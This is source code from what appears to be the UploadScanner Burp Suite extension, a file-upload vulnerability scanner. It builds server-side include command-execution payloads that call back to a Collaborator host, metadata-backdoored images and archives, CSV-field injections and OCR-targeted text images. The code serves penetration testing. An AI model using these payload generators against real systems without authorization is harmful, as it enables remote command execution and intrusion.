    # As we currently do around 2000 files, where only max. half of them have Collaborator payloads, 33 is fine.
    # Let's be on the safe side and do 34
    FIXED_PAYLOAD_SIZE = 34
    PADDING_CHAR = "N"

    # A IBurpCollaboratorClientContext object that also knows if the
    # collaborator is configured with a DNS name or as an IP
    # Also creates fixed size payloads, always length FIXED_PAYLOAD_SIZE + 1 + len(server location)
    def __init__(self, callbacks):
        self.is_ip_collaborator = False
        self.is_available = False
        self.burp_colab = callbacks.createBurpCollaboratorClientContext()
        if self.burp_colab:
            # IP Form:  192.168.0.1/payload
            # DNS Form: payload.burpcollaborator.net
            try:
                self.is_ip_collaborator = '/' in FloydsHelpers.u2s(callbacks.createBurpCollaboratorClientContext().generatePayload(True))
                self.server_location = FloydsHelpers.u2s(self.burp_colab.getCollaboratorServerLocation())
                self.is_available = True
            except IllegalStateException:
                # happens when Option "Don't use Burp Collaborator" is chosen in project options
                self.burp_colab = None

    def fetchAllCollaboratorInteractions(self):
        return self.burp_colab.fetchAllCollaboratorInteractions()

    def getCollaboratorServerLocation(self):
        return self.burp_colab.getCollaboratorServerLocation()

    def generate_payload(self, includeCollaboratorServerLocation):
        payload = FloydsHelpers.u2s(self.burp_colab.generatePayload(includeCollaboratorServerLocation))
        return self.add_padding(payload)

    def add_padding(self, payload):
        current_length = len(payload)
        if self.server_location in payload:
            current_length -= len(self.server_location)
            # The . or /
            current_length -= 1
        padding = BurpCollaborator.FIXED_PAYLOAD_SIZE - current_length
        if padding < 0:
            print "Warning: Something is wrong with fixed size payload calculation in BurpCollaborator class. " \
                  "Did you reconfigure the Collaborator server?"
        elif padding == 0:
            pass  # No need to do padding
        else:  # 1 and above
            if self.is_ip_collaborator:
                # IP Form:  192.168.0.1/payload
                # We create: 192.168.0.1/payload/NNNNNNNNNN
                payload = payload + "/" + (padding - 1) * BurpCollaborator.PADDING_CHAR
            else:
                # DNS Form: payload.burpcollaborator.net
                # We create: NNNNN.payload.burpcollaborator.net
                if padding == 1:
                    # Because .payload.burpcollaborator.net  is invalid but
                    #          payload.burpcollaborator.net. isn't
                    payload += "."
                else:
                    payload = (padding - 1) * BurpCollaborator.PADDING_CHAR + "." + payload
        return payload

    def remove_padding(self, payload):
        if self.is_ip_collaborator:
            # IP Form:  192.168.0.1/payload
            while payload.endswith(BurpCollaborator.PADDING_CHAR):
                payload = payload[:-1]
            if payload.endswith("/"):
                # Remove / as well:
                payload = payload[:-1]
        else:
            # DNS Form: payload.burpcollaborator.net
            while payload.startswith(BurpCollaborator.PADDING_CHAR):
                payload = payload[1:]
            if payload.startswith("."):
                # Remove / as well:
                payload = payload[1:]
        return payload

    def get_dummy_payload(self):
        if self.is_ip_collaborator:
            return self.server_location + "/" + BurpCollaborator.FIXED_PAYLOAD_SIZE * BurpCollaborator.PADDING_CHAR
        else:
            return BurpCollaborator.FIXED_PAYLOAD_SIZE * BurpCollaborator.PADDING_CHAR + "." + self.server_location


# SSI with BackdooredFile and Burp Collaborator payloads
class SsiPayloadGenerator:
    def __init__(self, burp_colab, cmd, server, replace):
        self.burp_colab = burp_colab
        self.cmd = cmd
        self.placeholder = self.burp_colab.get_dummy_payload()
        if replace is None:
            # we only support HTTP currently, no HTTPS...
            # but this is fine as it's only for IP-based Collaborators or UI option wget payloads
            self.server = server.replace(BurpExtender.MARKER_COLLAB_URL, 'http://' + self.placeholder)
        else:
            self.server = server.replace(replace, self.placeholder)

    def payload_func(self):
        return '<!--#exec cmd="{} {}" -->'.format(self.cmd, self.server), None


class Injector(object):
    def get_url(self):
        return FloydsHelpers.u2s(self._helpers.analyzeRequest(self._brr).getUrl().toString())

    def get_uploaded_filename(self):
        return ''

    def get_uploaded_content_type(self):
        return ''

    def get_types(self, all_types):
        new_types = set()
        for prefix, ext, mime_type in all_types:
            if BurpExtender.MARKER_ORIG_EXT in ext:
                ext = ext.replace(BurpExtender.MARKER_ORIG_EXT, self.get_default_file_ext())
            if not mime_type:
                # The "use original mime type" marker is an empty string
                mime_type = self.get_uploaded_content_type()
            new_types.add((prefix, ext, mime_type))
        # Further reduction if no mime or no filename is sent
        has_filename = self.get_uploaded_filename()
        has_mime = self.get_uploaded_content_type()
        if has_filename and has_mime:
            return new_types
        elif has_filename:
            return set([(x[0], x[1], '') for x in new_types])
        elif has_mime:
            return set([('', '', x[2]) for x in new_types])
        else:
            return [('', '', ''), ]


class FlexiInjector(Injector):
    # Can be used for any insertionPoint, as we simply globaly change stuff
    # with search/replace in the request.
    def __init__(self, base_request_response, options, helpers, newline):
        self._brr = base_request_response
        self.opts = options
        self._req = FloydsHelpers.jb2ps(base_request_response.getRequest())
        self._helpers = helpers
        self._newline = newline
        self._encoders = [
            lambda x: x,
            lambda x: x.encode("hex"),
            urllib.quote,
            lambda x: urllib.quote(x, ''),
            urllib.quote_plus,
            lambda x: urllib.quote_plus(x, '/'),

            lambda x: x.encode("base64").strip(),  # multiline MIME base64: alphanum, +, /, \n (after every 76 chars)
            lambda x: urllib.quote(x.encode("base64").strip(), ''),
            # multiline MIME base64: alphanum, %2B, %2F, %0A (after every 76 chars)
            lambda x: urllib.quote(x.encode("base64").strip()),
            # multiline MIME base64: alphanum, %2B, /, %0A (after every 76 chars)

            lambda x: x.encode("base64").replace('\n', '').replace('\r', '').strip(),  # one line base64: alphanum, +, /
            lambda x: urllib.quote(x.encode("base64").replace('\n', '').replace('\r', '').strip(), ''),
            # one line base64: alphanum, %2B, %2F
            lambda x: urllib.quote(x.encode("base64").replace('\n', '').replace('\r', '').strip()),
            # one line base64: alphanum, %2B, /
        ]
        self._default_file_extension = FloydsHelpers.u2s(os.path.splitext(self.opts.fi_ofilename)[1]) or ''

    def get_default_file_ext(self):
        return self._default_file_extension

    def get_brr(self):
        return self._brr

    def get_uploaded_content(self):
        for encoder in self._encoders:
            i = encoder(self.opts.fi_ocontent)
            # print repr(i)
            if i in self._req:
                return self.opts.fi_ocontent

    def get_uploaded_filename(self):
        for encoder in self._encoders:
            i = encoder(self.opts.fi_ofilename)
            # print repr(i)
            if i in self._req:
                return self.opts.fi_ofilename
        # Seems the filename is not part of the request
        # (which is actually quiet common, eg. Vimeo avatar image upload)
        # So we just return an empty string
        return ''

    def get_uploaded_content_type(self):
        for encoder in self._encoders:
            i = encoder(self.opts.fi_filemime)
            # print repr(i)
            if i in self._req:
                return self.opts.fi_filemime
        # Seems the mime type is not part of the request
        # (which is actually quiet common, eg. Vimeo avatar image upload)
        # So we just return an empty string
        return ''

    def get_request(self, filename, content, content_type=None):
        iRequest = self._helpers.analyzeRequest(self._req)
        status_headers, body = self._req[:iRequest.getBodyOffset()], self._req[iRequest.getBodyOffset():]
        status_line = status_headers.split(self._newline)[0]
        headers = self._newline.join(status_headers.split(self._newline)[1:])
        for encoder in self._encoders:
            if not filename == self.opts.fi_ofilename and self.opts.replace_filename and self.opts.fi_ofilename and not filename is None:
                o = encoder(self.opts.fi_ofilename)
                n = encoder(filename)
                if encoder == self._encoders[0]:
                    # The no-encoder. We need to do this, otherwise HTTP messages
                    # could be turned into HTTP/0.9 message by introducing a whitespace
                    status_line = status_line.replace(o, urllib.quote(n))
                else:
                    status_line = status_line.replace(o, n)
                body = body.replace(o, n)
                headers = headers.replace(o, n)
            if not content == self.opts.fi_ocontent and self.opts.fi_ocontent:
                o = encoder(self.opts.fi_ocontent)
                n = encoder(content)
                if encoder == self._encoders[0]:
                    # The no-encoder
                    status_line = status_line.replace(o, urllib.quote(n))
                else:
                    status_line = status_line.replace(o, n)
                body = body.replace(o, n)
                headers = headers.replace(o, n)
                if self.opts.replace_filesize and o in body and len(o) > 100:
                    status_line = status_line.replace(str(len(o)), str(len(n)))
                    body = body.replace(str(len(o)), str(len(n)))
                    # But what if str(len(o)) is part of n ?
                    # Then we just destroyed our n with this replacement.
                    # But with the following hack we undo it again.
                    # A little bit ugly, but should work fine.
                    if str(len(o)) in n:
                        destroyed_content = n.replace(str(len(o)), str(len(n)))
                        body.replace(destroyed_content, n)
            if content_type and self.opts.replace_ct and self.opts.fi_filemime:
                # This is not optimal: our python code might not detect exactly the same mime type
                # as the browser/client software sends. However, the user can specify the original
                # mime type in the UI which has to be sufficient for now
                o = encoder(self.opts.fi_filemime)
                n = encoder(content_type)
                if encoder == self._encoders[0]:
                    # The no-encoder
                    status_line = status_line.replace(o, urllib.quote(n))
                else:
                    status_line = status_line.replace(o, n)
                body = body.replace(o, n)
                headers = headers.replace(o, n)
        status_headers = status_line + self._newline + headers
        return FloydsHelpers.fix_content_length(status_headers, len(body), self._newline) + body


class MultipartInjector(Injector):
    # Can *ONLY* be used for IScannerInsertionPoint.INS_PARAM_MULTIPART_ATTR checks
    # where insertionPoint.getInsertionPointName() == "filename"
    # You might ask why this class is necessary, because we could always use FlexiInjector
    # That's correct, but this class can *automatically* scan without any configuration necessary!
    def __init__(self, base_request_response, options, insertionPoint, helpers, newline):
        self._brr = base_request_response
        self.opts = options
        self._req = FloydsHelpers.jb2ps(base_request_response.getRequest())
        self._insertionPoint = insertionPoint
        self._helpers = helpers
        self._newline = newline
        self._default_file_extension = FloydsHelpers.file_extension(self._insertionPoint) or ''
        # print "self._default_file_extension", self._default_file_extension

    def get_uploaded_content(self):
        start, _ = self._insertionPoint.getPayloadOffsets(self._insertionPoint.getBaseValue())
        meant_multipart_index, multiparts, boundary, headers = self._split_multipart(self._req, start)
        # print "meant_multipart_index, multiparts, boundary, headers", [meant_multipart_index, multiparts, boundary, headers]
        if multiparts:
            content = self.get_multipart_content(multiparts[meant_multipart_index])
            # as defined in get_multipart_content this returns the content plus a self._newline at the end
            # Although that's fine for internal multipart handling, we don't want the self._newline here:
            content = content[:-len(self._newline)]
            return content

    def get_default_file_ext(self):
        return self._default_file_extension

    def get_brr(self):
        return self._brr

    def get_uploaded_content_type(self):
        start, _ = self._insertionPoint.getPayloadOffsets(self._insertionPoint.getBaseValue())
        meant_multipart_index, multiparts, boundary, headers = self._split_multipart(self._req, start)
        if multiparts:
            # print "type self.get_multipart_content_type(multiparts[meant_multipart_index])", type(self.get_multipart_content_type(multiparts[meant_multipart_index]))
            return self.get_multipart_content_type(multiparts[meant_multipart_index])

    def get_uploaded_filename(self):
        # print "type self._insertionPoint.getBaseValue()", type(self._insertionPoint.getBaseValue())
        base_value = self._insertionPoint.getBaseValue()
        if base_value: # getBaseValue() might be None in rare cases
            return FloydsHelpers.u2s(base_value)
        else:
            return ''

    def get_request(self, filename, content, content_type=None):
        attack = FloydsHelpers.jb2ps(self._insertionPoint.buildRequest(filename))
        start, _ = self._insertionPoint.getPayloadOffsets(filename)
        meant_multipart_index, multiparts, boundary, status_headers = self._split_multipart(attack, start)
        if multiparts:
            old_size = str(len(self.get_uploaded_content()))
            new_size = str(len(content))
            old_ct = self.get_uploaded_content_type()
            new_ct = content_type
            old_filename = self.get_uploaded_filename()
            new_filename = filename
            for index, multipart in enumerate(multiparts):
                if index == meant_multipart_index:
                    # Where we will inject the content, we will only do header changes
                    multipart_headers = self.get_multipart_headers(multipart)
                    if multipart_headers and self.opts.replace_filesize and old_size in multipart_headers and old_size > 100 and old_size != new_size:
                        # print "Replacing in the multipart header with content old content size", old_size, "with new size", new_size
                        multipart_headers = multipart_headers.replace(old_size, new_size)
                        multipart = multipart_headers + self._newline + self._newline + self.get_multipart_content(
                            multipart)
                        multiparts[index] = multipart
                    if multipart_headers and self.opts.replace_filename and old_filename and old_filename in multipart_headers and old_filename != new_filename:
                        # print "Replacing in the multipart header with content old filename", repr(old_filename), "with new filename", new_filename
                        multipart_headers = multipart_headers.replace(old_filename, new_filename)
                        multipart = multipart_headers + self._newline + self._newline + self.get_multipart_content(
                            multipart)
                        multiparts[index] = multipart
                        # We do not need to replace the Content-Type here, it will be replaced automatically in this
                        # header multipart in the _set_multipart_content function, which will also
                        # honor self.opts.replace_ct
                else:
                    if self.opts.replace_filesize and old_size > 100 and old_size and old_size in multipart and old_size != new_size:
                        # print "Replacing old content size", old_size, "with new size", new_size, "in multipart number", index
                        new_multipart = multipart.replace(old_size, new_size)
                        multiparts[index] = new_multipart
                    if self.opts.replace_ct and old_ct and new_ct and old_ct and old_ct in multipart and old_ct != new_ct :
                        # print "Replacing old content-type", old_ct, "with new", new_ct, "in multipart number", index
                        new_multipart = multipart.replace(old_ct, new_ct)
                        multiparts[index] = new_multipart
                    if self.opts.replace_filename and old_filename and old_filename in multipart and old_filename != new_filename:
                        # print "Replacing old filename", old_filename, "with new", new_filename, "in multipart number", index
                        new_multipart = multipart.replace(old_filename, new_filename)
                        multiparts[index] = new_multipart
            # Now also take care that a filename in the URL is replaced with the new filename
            if self.opts.replace_filename and old_filename and old_filename != new_filename:
                status_line = status_headers.split(self._newline)[0]
                headers = self._newline.join(status_headers.split(self._newline)[1:])
                status_line = status_line.replace(old_filename, urllib.quote(new_filename))
                status_line = status_line.replace(urllib.quote(old_filename), urllib.quote(new_filename))
                status_headers = status_line + self._newline + headers
            # Now finally set the file content
            new = self._set_multipart_content(multiparts[meant_multipart_index], content, content_type)
            if new:
                multiparts[meant_multipart_index] = new
                return self._join_multipart(status_headers, multiparts, boundary)
        else:
            return None

    def get_multipart_headers(self, multipart):
        double_newline = self._newline + self._newline
        header_body = multipart.split(double_newline)
        if not len(header_body) >= 2:
            print "Warning: Strange multipart that has no header and body! Assuming there is only a body."
            return ''
        # This starts with a self._newline, but doesn't end in one
        return header_body[0]

    def get_multipart_content(self, multipart):
        double_newline = self._newline + self._newline
        header_body = multipart.split(double_newline)
        if not len(header_body) >= 2:
            print "Warning: Strange multipart that has no header and body! Assuming there is only a body."
            return multipart
        body = header_body[1:]
        # This does not start with a self._newline, but ends in one
        return double_newline.join(body)

    def get_multipart_content_type(self, multipart):
        headers = self.get_multipart_headers(multipart)
        if headers:
            header_lines = headers.split(self._newline)
            for header in header_lines:
                if header.lower().startswith('content-type: '):
                    return header[len('content-type: '):]
        print "Error: Couldn't find Content-Type header in Multipart."

    def _split_multipart(self, request, payload_offset):
        i_request_info = self._helpers.analyzeRequest(request)
        boundary = self._find_boundary([FloydsHelpers.u2s(x) for x in i_request_info.getHeaders()])
        if not boundary:
            print "Error: No boundary found"
            return None, None, None, None
        body_offset = i_request_info.getBodyOffset()
        headers = request[:body_offset]
        body = request[body_offset:]
        actual_boundary = "--" + boundary
        if not body.startswith(actual_boundary):
            print "Error: Body does not start with two hyphens plus boundary"
            print "First 60 chars of body:  ", repr(body[:60])
            print "First boundary should be:", repr(actual_boundary)
            return None, None, None, None
        multiparts = body.split(actual_boundary)
        multiparts = multiparts[1:]
        if not multiparts[-1].strip() == "--":
            print "Error: Body does not end with boundary plus two hyphens!"
            print "End of multipart:  ", repr(multiparts[-1])
            return None, None, None, None
        multiparts = multiparts[:-1]
        # so which multipart is meant with the insertionPoint?
        # first there is the boundary in the HTTP Content-Type header
        # then the first one for the first. So by counting the numbers
        # of boundaries - 1 (the one in the header) up to our insertion point
        # we know which multipart is ours
        meant_multipart_index = request[:payload_offset].count(boundary) - 1
        # but as we cut away the surrounding two-hyphen and the beginning and the end
        # it's actually even one less in our indexed multiparts list
        meant_multipart_index -= 1
        # Every multipart now starts with self._newline and ends with self._newline
        return meant_multipart_index, multiparts, boundary, headers

    def _find_boundary(self, headers):
        multipart_header = None
        for x in headers:
            if "content-type: multipart/form-data" == x[:len("content-type: multipart/form-data")].lower():
                multipart_header = x
                break
        else:
            print "Error: Although this is supposed to be a INS_PARAM_MULTIPART_ATTR we couldn't find the content-type: multipart/form-data header"
            return None
        if 'boundary=' in multipart_header:
            boundary = multipart_header.split('boundary=')[1]
            if ";" in boundary:
                boundary = boundary.split(";")[0]
            return boundary.strip()
        else:
            print "Error: Although this is supposed to be a INS_PARAM_MULTIPART_ATTR we couldn't find the boundary in the content-type: multipart/form-data header"
            return None

    def _set_multipart_content(self, multipart, content, content_type):
        header = self.get_multipart_headers(multipart)
        if not header:
            print "Warning: Strange multipart that has no header and body! Assuming there is only a body."
            return self._newline + content + self._newline
        header_lines = header.split(self._newline)
        # header_lines is usually an empty string (newline after the beginning boundary)
        # at index 0, followed by content-disposition and content-type. So:
        # [0]:
        # [1]:Content-Disposition: form-data; name="file"; filename="example.jpeg"
        # [2]:Content-Type: image/jpeg
        if len(header_lines) < 3:
            # we simply assume that there is only a Content-Disposition header (otherwise
            # Burp wouldn't have passed a INS_PARAM_MULTIPART_ATTR)
            print "Warning: Strange multipart that has only one header (usually there is at least Content-Disposition and Content-Type)"
            print "Header:", header
        if content_type and self.opts.replace_ct:
            # Find Content-Type header
            content_type_header_index = None
            for index, header in enumerate(header_lines):
                if header.lower().startswith('content-type: '):
                    content_type_header_index = index
                    break
            else:
                # Didn't find a Content-Type header, so we won't set it either
                print "Warning: Strange multipart that has headers, but no Content-Type header"
                return self._newline.join(header_lines) + self._newline + self._newline + content + self._newline
            name = header_lines[content_type_header_index][:len('content-type: ')]  # trick to use original capitalization of "Content-Type"
            header_lines[content_type_header_index] = name + content_type
        # Again, we end up with a multipart that starts with a self._newline and ends in a self._newline
        return self._newline.join(header_lines) + self._newline + self._newline + content + self._newline

    def _join_multipart(self, headers, parts, boundary):
        actual_boundary = "--" + boundary
        # this works as each part always starts and ends with self._newline
        new_body = actual_boundary + actual_boundary.join(parts) + actual_boundary + "--" + self._newline
        headers = FloydsHelpers.fix_content_length(headers, len(new_body), self._newline)
        return headers + new_body


class InsertionPointProviderForActiveScan(IScannerInsertionPointProvider):
    # This class is not needed in the UploadScanner except to provide InsertionPoints as a
    # IScannerInsertionPointProvider when getInsertionPoints is called from ActiveScan
    def __init__(self, extender=None, opts=None, helpers=None, injector=None):
        if injector:
            self.burp_extender = injector.opts._burp_extender
            self._opts = injector.opts
            self._helpers = injector._helpers
        else:
            self.burp_extender = extender
            self._opts = opts
            self._helpers = helpers
        self.exiftool_techniques = [
            # See BackdooredFiles for details... we don't use the thumbnail technique.
            ("keywords", "-keywords=", [".pdf", ".mp4" ]),
            ("comment", "-comment=", [".gif", ".jpeg", ".png"]),
            # We don't do iptckeywords as it's limited to 64 characters and ActiveScan will produce longer payloads
            # and there is a Burp limitation that we can not return a "sorry, can't produce a request with this long
            # payload"
            # ("iptckeywords", "-iptc:keywords=", [".jpeg", ".tiff"]),
            ("xmpkeywords", "-xmp:keywords=", [".gif", ".jpeg", ".pdf", ".png", ".tiff", ".mp4"]),
            ("exifImageDescription", "-exif:ImageDescription=", [".jpeg", ".tiff"]),
        ]

    # This is actually from IScannerInsertionPointProvider, but no multi inheritance
    def getInsertionPoints(self, base_request_response):
        insertion_points = []
        try:
            injector = None
            req = FloydsHelpers.jb2ps(base_request_response.getRequest())
            request_lower = req.lower()
            if "content-type: multipart/form-data" in request_lower and \
                    CustomMultipartInsertionPoint.FILENAME_MARKER in req:
                print "MultipartInjector insertion point found for getInsertionPoint ActiveScan!"
                insertionPoint = CustomMultipartInsertionPoint(self._helpers, BurpExtender.NEWLINE, req)
                injector = MultipartInjector(base_request_response, self._opts, insertionPoint, self._helpers, BurpExtender.NEWLINE)
            elif self._opts.fi_ofilename:
                fi = FlexiInjector(base_request_response, self._opts, self._helpers, BurpExtender.NEWLINE)
                # We test only those requests where we find at least the content in the request as some implementations
                # might not send the filename to the server
                if fi.get_uploaded_content():
                    print "FlexiInjector insertion point found for getInsertionPoint ActiveScan!"
                    injector = fi
            if injector:
                # First the feature that we can detect CSVs
                insertion_points.extend(self.get_csv_insertion_points(injector))
                
                # Insertion provider that puts payloads into the image as text, to pwn OCR software as in
                # https://medium.com/@vishwaraj101/ocr-to-xss-42720d85f7fa
                insertion_points.extend(self.get_inverse_ocr_insertion_points(injector))

                # Then handle the zip files
                bf = BackdooredFile(None, tool=self._opts.image_exiftool)
                upload_type = ('', ".zip", BackdooredFile.EXTENSION_TO_MIME[".zip"])
                # Achieve bf.get_zip_files(payload_func, techniques=["name"])
                args = []
                kwargs = {"techniques": ["name"]}
                function = bf.get_zip_files
                insertion_points.append(InsertionPointForActiveScan(injector, upload_type, function, args, kwargs))

                # Achieve bf.get_zip_files(payload_func, techniques=["content"])
                args = []
                kwargs = {"techniques": ["content"]}
                function = bf.get_zip_files
                insertion_points.append(InsertionPointForActiveScan(injector, upload_type, function, args, kwargs))

                for format in BackdooredFile.EXTENSION_TO_MIME.keys():
                    upload_type = ('', format, BackdooredFile.EXTENSION_TO_MIME[format])
                    # Now we still have the problem, that for a format, several payloads are generated
                    # so we can't really call create_files, but we need to call get_exiftool_images
                    # directly and tell it which techniques to use
                    size = (self._opts.image_width, self._opts.image_height)
                    for name, cmd_line_args, formats in self.exiftool_techniques:
                        if format in formats:
                            # Achieve bf.get_exiftool_images(payload_func, size, formats, techniques=None)
                            args = [size, [format, ]]
                            kwargs = {"techniques": [(name, cmd_line_args, [format, ]), ]}
                            function = bf.get_exiftool_images
                            insertion_points.append(InsertionPointForActiveScan(injector, upload_type, function, args, kwargs))
                # TODO: How about we also try to download the files we created InsertionPoints payloads for...?
        except:
            self.burp_extender.show_error_popup(traceback.format_exc(), "InsertionPointProviderForActiveScan.getInsertionPoints", base_request_response)
            raise sys.exc_info()[1], None, sys.exc_info()[2]
        return insertion_points

    def get_csv_insertion_points(self, injector):
        filename = injector.get_uploaded_filename().lower()
        insertion_points = []
        if ".csv" in filename or ".txt" in filename:
            file_content = injector.get_uploaded_content()
            if "\r\n" in file_content:
                new_line = "\r\n"
            else:
                new_line = "\n"
            lines = file_content.split(new_line)
            for delim in [",", ";", "\t"]:
                if delim in file_content:
                    # The first line in a CSV can be special (header)
                    # We choose it at the beginning, but prefer actually any other line in the CSV to inject
                    # We want to inject into the line with the most delimiters
                    line_index = 0
                    no_of_delim = 0
                    for i, line in enumerate(lines[1:]):
                        if line.count(delim) > no_of_delim:
                            line_index = i + 1
                            no_of_delim = line.count(delim)

                    # This might produce *a lot* of insertion points
                    for field_index in range(0, no_of_delim + 1):
                        insertion_points.append(CsvInsertionPoint(injector, new_line, delim, line_index, field_index))
        return insertion_points

    def get_inverse_ocr_insertion_points(self, injector):
        insertion_points = []
        for file_type in ["png", "jpeg"]:
            insertion_points.append(ReverseOcrInsertionPoint(injector, file_type))
        return insertion_points

class ReverseOcrInsertionPoint(IScannerInsertionPoint):
    def __init__(self, injector, file_type):
        self.injector = injector
        self.file_type = file_type
        self.width = injector.opts.image_width
        self.height = injector.opts.image_height
        self.index = 0

    def _create_text_image(self, text):
        img = BufferedImage(1, 1, BufferedImage.TYPE_INT_ARGB)
        g2d = img.createGraphics()
        font = Font("Arial", Font.PLAIN, 100)
        g2d.setFont(font)
        fm = g2d.getFontMetrics()
        width = fm.stringWidth(text)
        height = fm.getHeight()
        g2d.dispose()

        img = BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB)
        g2d = img.createGraphics()
        g2d.setRenderingHint(RenderingHints.KEY_ALPHA_INTERPOLATION, RenderingHints.VALUE_ALPHA_INTERPOLATION_QUALITY)
        g2d.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON)
        g2d.setRenderingHint(RenderingHints.KEY_COLOR_RENDERING, RenderingHints.VALUE_COLOR_RENDER_QUALITY)
        g2d.setRenderingHint(RenderingHints.KEY_DITHERING, RenderingHints.VALUE_DITHER_ENABLE)
        g2d.setRenderingHint(RenderingHints.KEY_FRACTIONALMETRICS, RenderingHints.VALUE_FRACTIONALMETRICS_ON)
        g2d.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR)
        g2d.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY)
        g2d.setRenderingHint(RenderingHints.KEY_STROKE_CONTROL, RenderingHints.VALUE_STROKE_PURE)
        g2d.setFont(font)
        fm = g2d.getFontMetrics()
        g2d.setColor(Color.BLACK)
        g2d.drawString(text, 0, fm.getAscent())
        g2d.dispose()

        # From the documentation of Java Image:
        # If either width or height is a negative number then a value is substituted to maintain the aspect
        # ratio of the original image dimensions.
        rescaled = img
        if img.getWidth() >= self.width:
            rescaled = img.getScaledInstance(self.width - 6, -1, Image.SCALE_DEFAULT)
        newImage = BufferedImage(self.width, self.height, BufferedImage.TYPE_INT_ARGB)
        g = newImage.getGraphics()
        g.drawImage(rescaled, 3, 3, None)
        g.dispose()
        img = newImage

        output_stream = ByteArrayOutputStream()
        ImageIO.write(img, self.file_type, output_stream)
        output = FloydsHelpers.jb2ps(output_stream.toByteArray())
        return output

    def create_request(self, payload):
        content = self._create_text_image(payload)
        req = self.injector.get_request("ActiveScanOcrAttack" + str(self.index) + "." + self.file_type, content)
        self.index += 1
        return req, payload, content

    def buildRequest(self, payload):
        req, _, _ = self.create_request(FloydsHelpers.jb2ps(payload))
        return req

    def getBaseValue(self):
        # A blank image
        return ""

    def getInsertionPointName(self):
        return ""

    def getInsertionPointType(self):
        # TODO: What's best? Alternatives:
        # INS_PARAM_BODY
        # INS_PARAM_MULTIPART_ATTR
        # INS_UNKNOWN
        return IScannerInsertionPoint.INS_EXTENSION_PROVIDED

    def getPayloadOffsets(self, payload):
        payload = FloydsHelpers.jb2ps(payload)
        req, payload, _ = self.create_request(payload)
        if payload in req:
            start = req.index(payload)
            return [start, start + len(payload)]
        else:
            return None

class CsvInsertionPoint(IScannerInsertionPoint):
    def __init__(self, injector, new_line, delim, line_index, field_index):
        self.injector = injector
        self.new_line = new_line
        self.delim = delim
        self.line_index = line_index
        self.field_index = field_index

        self.lines = injector.get_uploaded_content().split(self.new_line)
        self.fields = self.lines[self.line_index].split(self.delim)

        self.index = 0

    def create_request(self, payload):
        fields = copy.copy(self.fields)
        if fields[self.field_index].startswith('"') and fields[self.field_index].endswith('"'):
            # Let's assume it is a quoted CSV
            # RFC-4180, "If double-quotes are used to enclose fields, then a double-quote appearing inside a
            # field must be escaped by preceding it with another double quote."
            payload = '"' + payload.replace('"', '""') + '"'
            fields[self.field_index] = payload
        else:
            fields[self.field_index] = payload
        line = self.delim.join(fields)
        lines = copy.copy(self.lines)
        lines[self.line_index] = line
        content = self.new_line.join(lines)
        req = self.injector.get_request("ActiveScanCsvAttack" + str(self.index) + self.injector.get_uploaded_filename()[-4:], content)
        self.index += 1
        return req, payload, content

    def buildRequest(self, payload):
        req, _, _ = self.create_request(FloydsHelpers.jb2ps(payload))
        return req

    def getBaseValue(self):
        return self.fields[self.field_index]

    def getInsertionPointName(self):
        return ""

    def getInsertionPointType(self):
        # TODO: What's best? Alternatives:
        # INS_PARAM_BODY
        # INS_PARAM_MULTIPART_ATTR
        # INS_UNKNOWN
        return IScannerInsertionPoint.INS_EXTENSION_PROVIDED

    def getPayloadOffsets(self, payload):
        payload = FloydsHelpers.jb2ps(payload)
        req, payload, _ = self.create_request(payload)
        if payload in req:
            start = req.index(payload)
            return [start, start + len(payload)]
        else:
            return None


class InsertionPointForActiveScan(IScannerInsertionPoint):
    # Where can we inject?
    # 1. Backdoored file locations (combinatoric explosion!)
    #  - All filetypes, currently: gif, png, bmp, jpeg, tiff, pdf, zip, mp4
    #  - All exiftool techniques, currently: keywords, comment, iptckeywords, xmpkeywords, exifImageDescription, thumbnailWithIptckeywords
    #  ---> Around 20 InsertionPoints

    def __init__(self, injector, upload_type, function, args, kwargs):
        self.injector = injector
        self.upload_type = upload_type
        self.function = function
        self.args = args
        self.kwargs = kwargs
        # Let's figure out the insertion point name
        self.insertion_point_name = "FileContentData"
        try:
            payload, expect, name, ext, content = self._create_content("TestWithAPayloadThatHasAGoodLength")
            if name and ext:
                self.insertion_point_name = "FileContent" + name + ext[1:]
        except StopIteration:
            print "Error: No file created in constructor of InsertionPointForActiveScan, this is probably pretty bad."
        self.index = 0

    def _create_content(self, payload):
        payload_func = lambda: (payload, None)
        args = [payload_func]
        args.extend(self.args)
        return next(iter(self.function(*args, **self.kwargs)))

    def _create_request(self, payload):
        if len(payload) < BackdooredFile.MINIMUM_PAYLOAD_LENGTH:
            payload += " " * (BackdooredFile.MINIMUM_PAYLOAD_LENGTH - len(payload))
        payload = payload[:BackdooredFile.MAXIMUM_PAYLOAD_LENGTH]
        try:
            payload, expect, name, ext, content = self._create_content(payload)
            if content:
                prefix, ext, mime_type = self.upload_type
                random_part = str(self.index)
                self.index += 1
                filename = prefix + "ActiveScan" + self.insertion_point_name + random_part + ext
                req = self.injector.get_request(filename, content, content_type=mime_type)
                if req:
                    return req, payload
        except StopIteration:
            print "No file created"
        return None, None

    def buildRequest(self, payload):
        req, _ = self._create_request(FloydsHelpers.jb2ps(payload))
        return req

    def getBaseValue(self):
        # Would it be good to have e.g. the XMP content as base value? Probably, but then that would also come in
        # as payload to buildRequest, which we then have to alter. Let's just say the "default" base value of
        # e.g. a keyword element of XMP metadata is empty
        return ""

    def getInsertionPointName(self):
        # TODO: What's best?
        return self.insertion_point_name

    def getInsertionPointType(self):
        # TODO: What's best? Alternatives:
        # INS_PARAM_BODY
        # INS_PARAM_MULTIPART_ATTR
        # INS_UNKNOWN
        return IScannerInsertionPoint.INS_EXTENSION_PROVIDED

    def getPayloadOffsets(self, payload):
        payload = FloydsHelpers.jb2ps(payload)
        req, payload = self._create_request(payload)
        if payload in req:
            start = req.index(payload)
            return [start, start + len(payload)]
        else:
            return None


class BackdooredFile:
    """
    The goal of this class is to provide an interface that allows generating files
    that have a specific payload visible in clear when the file is viewed in a hex editor.
    If the payload is not visible in the hex dump of the file, it is not implemented
    in this class.
    """
    # This one is easy and just arbitrarily set here
    MINIMUM_PAYLOAD_LENGTH = 5
    # This one is trickier:
    # Somewhere between 131072 and 262144 we get a subprocess "Argument list too long"
    # IPTC keywords (for sure for tiff) are limited to length 64 "Warning: [Minor] IPTC:Keywords exceeds length limit (truncated)"
    # All other seem rather unlimited
